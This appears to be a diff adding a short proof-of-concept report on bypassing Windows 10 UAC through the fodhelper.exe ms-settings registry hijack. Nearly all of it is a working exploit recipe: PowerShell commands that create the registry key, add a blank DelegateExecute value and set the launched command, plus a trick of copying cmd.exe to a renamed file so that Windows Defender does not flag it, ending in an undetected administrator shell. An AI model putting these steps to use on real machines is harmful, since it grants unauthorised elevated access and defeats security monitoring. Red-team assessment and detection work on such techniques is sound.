@@ -1,0 +1,36 @@
+#UAC PROMPT BYPASS – ELEVATED CMD PROPMPT
+
+1. Executive Summary
+This report details the successful bypass of UAC prompt to open admin cmd prompt aimed at evaluating its effectiveness in detecting and mitigating advanced adversary techniques. The assessment revealed specific weaknesses that allowed access of cmd prompt in admin mode without Windows defender detection and without UAC prompt.
+
+2. Assessment Scope
+•	Operating System: Windows 10
+•	PoC Date: 20 May 2025
+•	Objective: Generate PoC for UAC prompt bypass using LOL technique. 
+•	Result: Successfully launched cmd prompt with admin privilege without windows defender’s detection.
+
+3. Methodology
+The key stages of the PoC included:
+•	Choosing Living-off-the-Land technique: Fodhelper.exe.
+This exploit abuses a registry hijack under:
+HKCU\Software\Classes\ms-settings\shell\open\command
+•	Execution: Running the payload without triggering alerts.
+•	Defense Evasion: Bypassing heuristic/behavioral and signature-based detection(here, windows defender).
+
+4. Proof of Concept (PoC)
+•	Payload Creation - 
+•	Execution Windows 10 VM – 
+•	Steps: 
+1.	Create a registry key that fodhelper.exe checks when launched — giving you control over what gets executed: 
+New-Item "HKCU:\SOFTWARE\Classes\ms-settings\shell\open\command\" -Force
+2.	New-Item Property -Path "HKCU:\SOFTWARE\Classes\ms-settings\shell\open\command\" -Name "DelegateExecute" -Value "" -Force
+Adds a blank Delegate Execute property — a critical trick that suppresses the UAC prompt.
+3.	Set-ItemProperty -Path "HKCU:\SOFTWARE\Classes\ms-settings\shell\open\command\" -Name "(default)" -Value "cmd.exe" -Force
+	Sets the command to run (cmd.exe) when fodhelper is triggered.
+	This triggers Windows defender
+4.	To bypass this: 
+copy C:\Windows\System32\cmd.exe notes.exe (or to any common folder)
+5.	Run the command again: 
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "notes.exe" -Force
+Start-Process "C:\Windows\System32\fodhelper.exe"
+This time there are no alerts seen by Windows defender and cmd prompt gets opened in administrator mode
